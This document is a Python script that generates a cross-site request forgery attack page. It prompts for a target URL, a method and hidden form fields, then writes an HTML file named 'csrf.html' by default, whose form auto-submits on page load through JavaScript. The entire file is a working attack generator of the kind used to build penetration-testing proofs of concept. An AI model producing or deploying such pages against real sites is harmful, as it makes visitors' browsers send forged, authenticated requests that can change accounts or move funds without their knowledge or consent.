#!/usr/bin/env python3

action_url = input("Enter the action url for your form : ")
while ( action_url == ""): 
    print("The action url could not be empty")
    action_url = input("Enter the action url for your form : ")

form_id = input("Enter Form id (default: form) : ")
if form_id == "":
    form_id = "form"
method = input("Enter the Method (GET,POST,PUT,DELET, ... default:POST ) : ")
if method == "":
    method = "POST"

form_inputs = []
form_input = ""
i = 0 
while(True):
    i = i + 1
    form_input = input(r"Enter the name of your {0} input form(enter done for break) : ".format(i)) 
    if form_input == "done":
        break
    form_input_value = input(r"Enter the value of your {0} input form : ".format(i)) 
    form_input_type = input(r"Enter the type of your {0} input form (default: hidden) : ".format(i)) 
    form_input_id = input(r"Enter the id of your {0} input form (default: [your_input_name]) : ".format(i)) 
    if form_input == "":
        print(" The form input name could not be empty ... ")
        continue
    if form_input_type == "":
        form_input_type = "hidden"
    if form_input_id == "":
        form_input_id = form_input
    form_inputs.append({
            "name": form_input,
            "value": form_input_value,
            "id": form_input_id,
            "type": form_input_type,
    })

script = input("Enter your script(defualt:[just submit the form] : ")
if script == "":
    script = f"<script>document.getElementById('{form_id}').submit();</script>"


output_file_name = input("Enter the name of your html template(default: csrf.html) : ")
if output_file_name == "":
    output_file_name = "csrf.html"
# opening the output file
output_file = open(output_file_name, "w+")

template = ""

template += "<html>\n"
template += f"\t<form action='{action_url}' method='{method}' id='{form_id}'>\n" 
for inp in form_inputs:
    template += f"\t\t<input type='{inp['type']}' name='{inp['name']}' value='{inp['value']}' id='{inp['id']}'/>\n"
template += f"\t</form>\n"
template += "\t" + script + "\n"
template += "</html>"

output_file.write(template)
output_file.close()

print(f"your {output_file_name} succesfully created.")

